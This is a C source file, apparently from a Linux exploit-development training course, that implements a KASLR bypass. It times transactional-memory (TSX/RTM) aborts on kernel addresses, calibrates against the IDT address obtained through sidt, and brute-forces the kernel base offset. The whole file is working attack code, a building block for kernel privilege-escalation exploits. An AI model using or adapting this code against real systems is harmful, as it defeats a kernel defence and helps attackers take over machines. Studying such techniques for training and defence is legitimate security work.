/**
 * Linux exploit dev training - module 6 
 * vnik@cyseclabs.com
 **/

#define __USE_GNU
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <math.h>
#include <limits.h>

#include "util.h"

static uint64_t _get_cycles(uint64_t addr) {
	//unsigned long start = rdtsc_beg();
	unsigned long start = rdtscp();
	unsigned long tmp;
	
	if (_xbegin() == _XBEGIN_STARTED) {
		/* read access */
    		tmp = *((unsigned long *)addr);
    		_xend();
	} else {
		//return rdtsc_end() - start;
		return rdtscp() - start;
	}

	return tmp; /* for -O* optimisations */
}

uint64_t get_cycles(uint64_t addr, int rounds) {
	int i;
	uint64_t clk, min = ULONG_MAX;
	
	for (i = 0; i < _NROUNDS; i++) {
		clk = _get_cycles(addr);
		
		if (clk < min)
			min = clk;
	}

	return min;
}

static uint64_t get_mappped_cycles(void) {
	uint64_t clk;

	struct {
		uint16_t limit;
		uint64_t addr;
	} __attribute__((packed)) idt;

	asm volatile("sidt %0" : "=m" (idt));

	pin_cpu();
	clk = get_cycles(idt.addr, _NROUNDS);
	unpin_cpu();

	return clk;
}

static uint64_t get_bogus_cycles(void) {
	int i;
	uint64_t sum = 0, sum1 = 0;
	uint64_t samples[_NROUNDS];
	uint64_t min = ULONG_MAX;
	uint64_t variance, std_dev, mean;

	pin_cpu();

	for (i = 0; i < _NROUNDS; i++) {
		if (i == 0)
			/* skip the first unstable sample */
			continue;
		
		samples[i] = (long)_get_cycles(0xffffffff80000000);
		
		if (samples[i] < min)
			min = samples[i];

		sum += samples[i];
	}
	mean = sum / (_NROUNDS - 1);

	/* compute variance and standard deviation */
	for (i = 1; i < _NROUNDS; i++) {
		sum1 += pow((samples[i] - mean), 2);
	}
	variance = sum1 / (_NROUNDS - 1);
	std_dev = sqrt(variance);

	unpin_cpu();

#ifdef _DEBUG
	if (std_dev > _STD_DEV_THRESHOLD)
		printf("Bad samples but continuing anyway\n");
#endif

	return min - _SAFE_MARGIN;
}

static uint64_t bruteforce(uint64_t mapped, uint64_t bogus) {
	uint64_t __addr, koffset;
	uint64_t clk;

	for (__addr = 0xffffffff81000000; __addr < 0xffffffffff000000;
		__addr += 0x200000) {

		clk = get_cycles(__addr, _NROUNDS);

#ifdef _DEBUG
	        putchar('.');
		fflush(stdout);
#endif

		if (clk < bogus) {
			clk = get_cycles(__addr, _NROUNDS);

			if (clk < bogus) {
				koffset = __addr - 0xffffffff81000000;
#ifdef _DEBUG
				putchar('\n');
				printf("kALSR offset = 0x%lx\n", koffset);
				fflush(stdout);
#endif
				return koffset;
			}
		}
	}
}

uint64_t get_kaslr_offset(void) {
	uint64_t koffset, mapped = 0, bogus = 0;
	
	if (!cpu_has_rtm()) {
#ifdef _DEBUG
		printf("No TSX/RTM support. Bailing...\n");
#endif
		return -1;
	}

#ifdef _DEBUG
	printf("Sample iterations: %d\n", _NROUNDS);
	printf("Logical processors: %d\n", get_nprocs());
#endif

	start_cpu_load();
	pin_cpu();

	while (mapped >= bogus) {
		mapped = get_mappped_cycles();
		bogus  = get_bogus_cycles();
	}

#ifdef _DEBUG
	printf("mapped = %lu, bogus = %lu\n", mapped, bogus);
#endif
	koffset = bruteforce(mapped, bogus);
	unpin_cpu();
	stop_cpu_load();

	return koffset;
}
